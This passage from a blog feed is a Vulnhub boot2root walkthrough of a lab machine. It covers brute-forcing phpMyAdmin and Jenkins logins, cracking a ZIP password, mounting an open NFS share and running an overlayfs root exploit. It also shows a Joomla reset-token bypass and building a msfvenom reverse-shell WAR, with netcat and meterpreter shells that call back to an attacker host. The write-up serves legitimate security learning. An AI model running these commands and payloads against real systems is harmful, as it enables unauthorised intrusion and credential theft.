http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</code></p>

<p>And we have the password!</p>

<p><code>
patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
17:17:27 patator    INFO -                                                                              
17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:17:27 patator    INFO - -----------------------------------------------------------------------------
17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
</code></p>

<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<p><code>
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33719/tcp  mountd
|   100005  1,2,3      41291/udp  mountd
|   100021  1,3,4      47439/tcp  nlockmgr
|   100021  1,3,4      60285/udp  nlockmgr
|   100024  1          57769/udp  status
|   100024  1          58840/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
47439/tcp open  nlockmgr    1-4 (RPC #100021)
48137/tcp open  mountd      1-3 (RPC #100005)
58840/tcp open  status      1 (RPC #100024)
33719/tcp open  mountd      1-3 (RPC #100005)
43866/tcp open  mountd      1-3 (RPC #100005)
</code></p>

<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<p><code>
showmount -e 192.168.217.128
Export list for 192.168.217.128:
/backup *
</code></p>

<p>I mounted it on my machine and found an archive:</p>

<p><code>
root@kali:/mnt# mkdir backup
root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
ls -la
total 12760
drwxr-xr-x 2 root root     4096 Feb 14  2016 .
drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
</code></p>

<p>When I tried unzipping it, I got prompted for a password:</p>

<p><code>
unzip backup.tar.bz2.zip
Archive:  backup.tar.bz2.zip
[backup.tar.bz2.zip] backup.tar.bz2 password:
</code></p>

<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<p>```
fcrackzip &mdash;help</p>

<p>fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x70;&#x63;&#103;&#64;&#x67;&#x6f;&#x6f;&#x66;&#46;&#99;&#x6f;&#109;">&#112;&#x63;&#x67;&#64;&#x67;&#x6f;&#111;&#102;&#x2e;&#x63;&#111;&#109;</a> You can find more info on
<a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>

<p>USAGE: fcrackzip</p>

<pre><code>      [-b|--brute-force]            use brute force algorithm
      [-D|--dictionary]             use a dictionary
      [-B|--benchmark]              execute a small benchmark
      [-c|--charset characterset]   use characters from charset
      [-h|--help]                   show this message
      [--version]                   show the version of this program
      [-V|--validate]               sanity-check the algortihm
      [-v|--verbose]                be more verbose
      [-p|--init-password string]   use string as initial password/file
      [-l|--length min-max]         check password with length min to max
      [-u|--use-unzip]              use unzip to weed out wrong passwords
      [-m|--method num]             use method number "num" (see below)
      [-2|--modulo r/m]             only calculcate 1/m of the password
      file...                    the zipfiles to crack
</code></pre>

<p>methods compiled in (* = default):</p>

<p> 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```</p>

<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<p>```
fcrackzip -b -u -v backup.tar.bz2.zip
found file &lsquo;backup.tar.bz2&rsquo;, (size cp/uc 13057834/13076586, flags 9, chk 28e3)</p>

<p>PASSWORD FOUND!!!!: pw == aaaaaa
```</p>

<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<p><code>
ls
dvwa  gentleman  index.html  web-standards  zenphoto
</code></p>

<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<p><code>
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name:
|   FQDN: canyoupwnme
|_  System time: 2017-12-02T21:15:36+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2017-12-02 14:15:37
|_  start_date: 1600-12-31 19:03:58
</code></p>

<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<p><code>
PORT      STATE SERVICE     VERSION
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
</code></p>

<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<p><code>
cat /etc/issue
Ubuntu 14.04.3 LTS \n \l
</code></p>

<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<p><code>
admin@canyoupwnme:~$ ./overlayfs
root@canyoupwnme:~# id
uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
root@canyoupwnme:~# whoami
root
</code></p>

<h2>Redis</h2>

<p><code>
PORT      STATE SERVICE     VERSION
6379/tcp  open  redis       Redis key-value store 3.0.7
</code></p>

<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<p>```
redis-cli -h
redis-cli 4.0.2</p>

<p>Usage: redis-cli [OPTIONS] [cmd [arg [arg &hellip;]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
  -r <repeat>        Execute specified command N times.
  -i <interval>      When -r is used, waits <interval> seconds per command.</p>

<pre><code>                 It is possible to specify sub-second times like -i 0.1.
</code></pre>

<p>  -n <db>            Database number.
  -x                 Read last argument from STDIN.
  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
  &mdash;raw              Use raw formatting for replies (default when STDOUT is</p>

<pre><code>                 not a tty).
</code></pre>

<p>  &mdash;no-raw           Force formatted output even when STDOUT is not a tty.
  &mdash;csv              Output in CSV format.
  &mdash;stat             Print rolling stats about server: mem, clients, &hellip;
  &mdash;latency          Enter a special mode continuously sampling latency.</p>

<pre><code>                 If you use this mode in an interactive session it runs
                 forever displaying real-time stats. Otherwise if --raw or
                 --csv is specified, or if you redirect the output to a non
                 TTY, it samples the latency for 1 second (you can use
                 -i to change the interval), then produces a single output
                 and exits.
</code></pre>

<p>  &mdash;latency-history  Like &mdash;latency but tracking latency changes over time.</p>

<pre><code>                 Default time interval is 15 sec. Change it using -i.
</code></pre>

<p>  &mdash;latency-dist     Shows latency as a spectrum, requires xterm 256 colors.</p>

<pre><code>                 Default time interval is 1 sec. Change it using -i.
</code></pre>

<p>  &mdash;lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
  &mdash;slave            Simulate a slave showing commands received from the master.
  &mdash;rdb <filename>   Transfer an RDB dump from remote server to local file.
  &mdash;pipe             Transfer raw Redis protocol from stdin to server.
  &mdash;pipe-timeout <n> In &mdash;pipe mode, abort with error if after sending all data.</p>

<pre><code>                 no reply is received within &lt;n&gt; seconds.
                 Default timeout: 30. Use 0 to wait forever.
</code></pre>

<p>  &mdash;bigkeys          Sample Redis keys looking for big keys.
  &mdash;scan             List all keys using the SCAN command.
  &mdash;pattern <pat>    Useful with &mdash;scan to specify a SCAN pattern.
  &mdash;intrinsic-latency <sec> Run a test to measure intrinsic system latency.</p>

<pre><code>                 The test will run for the specified amount of seconds.
</code></pre>

<p>  &mdash;eval <file>      Send an EVAL command using the Lua script at <file>.
  &mdash;ldb              Used with &mdash;eval enable the Redis Lua debugger.
  &mdash;ldb-sync-mode    Like &mdash;ldb but uses the synchronous Lua debugger, in</p>

<pre><code>                 this mode the server is blocked and script changes are
                 are not rolled back from the server memory.
</code></pre>

<p>  &mdash;help             Output this help and exit.
  &mdash;version          Output version and exit.</p>

<p>Examples:
  cat /etc/passwd | redis-cli -x set mypasswd
  redis-cli get mypasswd
  redis-cli -r 100 lpush mylist x
  redis-cli -r 100 -i 1 info | grep used_memory_human:
  redis-cli &mdash;eval myscript.lua key1 key2 , arg1 arg2 arg3
  redis-cli &mdash;scan &mdash;pattern &lsquo;<em>:12345</em>&rsquo;</p>

<p>  (Note: when using &mdash;eval the comma separates KEYS[] from ARGV[] items)</p>

<p>When no command is given, redis-cli starts in interactive mode.
Type &ldquo;help&rdquo; in interactive mode for information on available commands
and settings.
```</p>

<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<p>```
redis-cli -h 192.168.217.128
192.168.217.128:6379> help
redis-cli 4.0.2
To get help about Redis commands type:</p>

<pre><code>  "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
  "help &lt;command&gt;" for help on &lt;command&gt;
  "help &lt;tab&gt;" to get a list of possible help topics
  "quit" to exit
</code></pre>

<p>To set redis-cli preferences:</p>

<pre><code>  ":set hints" enable online hints
  ":set nohints" disable online hints
</code></pre>

<p>Set your preferences in ~/.redisclirc
192.168.217.128:6379> info</p>

<h1>Server</h1>

<p>redis_version:3.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:aa70bcb321ba8313
redis_mode:standalone
os:Linux 3.19.0-25-generic i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.8.4
process_id:1263
run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
tcp_port:6379
uptime_in_seconds:3235
uptime_in_days:0
hz:10
lru_clock:2368010
config_file:/etc/redis/6379.conf</p>

<h1>Clients</h1>

<p>connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0</p>

<h1>Memory</h1>

<p>used_memory:637624
used_memory_human:622.68K
used_memory_rss:8929280
used_memory_peak:637624
used_memory_peak_human:622.68K
used_memory_lua:24576
mem_fragmentation_ratio:14.00
mem_allocator:jemalloc-3.6.0</p>

<h1>Persistence</h1>

<p>loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1512314215
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok</p>

<h1>Stats</h1>

<p>total_connections_received:2
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:41
total_net_output_bytes:6067614
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0</p>

<h1>Replication</h1>

<p>role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0</p>

<h1>CPU</h1>

<p>used_cpu_sys:3.71
used_cpu_user:1.60
used_cpu_sys_children:0.00
used_cpu_user_children:0.00</p>

<h1>Cluster</h1>

<p>cluster_enabled:0</p>

<h1>Keyspace</h1>

<p>192.168.217.128:6379>
```</p>

<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
</code></p>

<p>Time to look at that Tomcat server!</p>

<p>```
nikto -h <a href="http://192.168.217.128:8080/">http://192.168.217.128:8080/</a></p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.217.128</li>
<li>Target Hostname:    192.168.217.128</li>
<li>Target Port:        8080

<ul>
<li>Start Time:         2017-12-03 12:21:45 (GMT-5)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache-Coyote/1.1</li>
<li>Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</li>
<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
<li>/: Appears to be a default Apache Tomcat install.</li>
<li>/examples/servlets/index.html: Apache Tomcat default JSP pages present.</li>
<li>OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</li>
<li>Default account found for &lsquo;Tomcat Manager Application&rsquo; at /manager/html (ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;). Apache Tomcat.</li>
<li>/manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/manager/status: Tomcat Server Status interface found (pass protected)</li>
<li>7661 requests: 0 error(s) and 14 item(s) reported on remote host

<ul>
<li>End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="&lsquo;manager&rsquo; &lsquo;tomcat web application manager&rsquo;" ></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<p><code>
msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: runme.war
</code></p>

<p>Check what&rsquo;s inside:</p>

<p><code>
jar -tf runme.war
WEB-INF/
WEB-INF/web.xml
kndeoavjwgjs.jsp
</code></p>

<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
whoami
tomcat7
</code></p>

<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries
| /administrator/ /cache/ /components/ /images/
| /includes/ /installation/ /language/ /libraries/ /media/
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
</code></p>

<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<p>```
* The Exact version found is 1.5.1</p>

<h1>15</h1>

<p>Info &ndash;> CoreComponent: Joomla Remote Admin Password Change Vulnerability
Versions Affected: 1.5.5 &lt;=
Check: /components/com_user/controller.php
Exploit: 1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm  2. Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
Vulnerable? Yes
```</p>

<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="&lsquo;token&rsquo; &lsquo;password reset bypass&rsquo;" ></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="&lsquo;template&rsquo; &lsquo;joomla template&rsquo;" ></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></p>

<h2>Jenkins</h2>

<p><code>
PORT      STATE SERVICE     VERSION
9000/tcp  open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
</code></p>

<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="&lsquo;jenkins&rsquo; &lsquo;jenkins dashboard&rsquo;" ></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<p>```
msf auxiliary(jenkins_enum) > info</p>

<pre><code>   Name: Jenkins-CI Enumeration
 Module: auxiliary/scanner/http/jenkins_enum
License: Metasploit Framework License (BSD)
   Rank: Normal
</code></pre>

<p>Provided by:
  Jeff McCutchan</p>

<p>Basic options:
  Name       Current Setting  Required  Description</p>

<hr />

<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host</p>

<p>Description:
  This module enumerates a remote Jenkins-CI installation in an
  unauthenticated manner, including host operating system and Jenkins
  installation details.
```</p>

<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<p>```
msf auxiliary(jenkins_enum) > exploit</p>

<p>[+] 192.168.217.128:9000  &ndash; Jenkins Version 1.647
[<em>] /script restricted (403)
[</em>] /view/All/newJob restricted (403)
[+] <a href="http://192.168.217.128:9000/">http://192.168.217.128:9000/</a> &ndash; /asynchPeople/ does not require authentication (200)
[*] /systemInfo restricted (403)
```</p>

<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="&lsquo;jenkins admin&rsquo; &lsquo;jenkins admin&rsquo;" ></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<p>```
Module options (auxiliary/scanner/http/jenkins_login):</p>

<p>   Name              Current Setting                                     Required  Description</p>

<hr />

<p>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
   PASSWORD                                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
   RPORT             9000                                                yes       The target port (TCP)
   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
   THREADS           1                                                   yes       The number of concurrent threads
   USERNAME          admin                                               no        A specific username to authenticate as
   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                               no        Try the username as the password for all users
   USER_FILE                                                             no        File containing usernames, one per line
   VERBOSE           true                                                yes       Whether to print output for all attempts
   VHOST                                                                 no        HTTP server virtual host
```</p>

<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<p><code>
[+] 192.168.217.128:9000 - Login Successful: admin:hello
</code></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<p>```
options</p>

<p>Module options (exploit/multi/http/jenkins_script_console):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   API_TOKEN                   no        The API token for the specified username
   PASSWORD   hello            no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST      192.168.217.128  yes       The target address
   RPORT      9000             yes       The target port (TCP)
   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            no        The username to authenticate as
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.217.132  yes       The listen address
   LPORT  8080             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   1   Linux
```</p>

<p>And a new shell appears!</p>

<p>```
msf exploit(jenkins_script_console) > exploit</p>

<p>[<em>] Started reverse TCP handler on 192.168.217.132:8080
[</em>] Checking access to the script console
[<em>] Logging in&hellip;
[</em>] 192.168.217.128:9000 &ndash; Sending Linux stager&hellip;
[<em>] Sending stage (849108 bytes) to 192.168.217.128
[</em>] Meterpreter session 1 opened (192.168.217.132:8080 &ndash;> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500</p>

<p>meterpreter >
[!] Deleting /tmp/wE472W payload file
```</p>

<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<p><code>
PORT      STATE SERVICE     VERSION
46201/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequest:
|     Unrecognized protocol:
|   DNSVersionBindReq:
|     Unrecognized protocol:
|     version
|_    bind
53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
</code></p>

<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<p>```</p>

<hr />

<p>/ This will be a memorable month &mdash; no  \
\ matter how hard you try to forget it. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
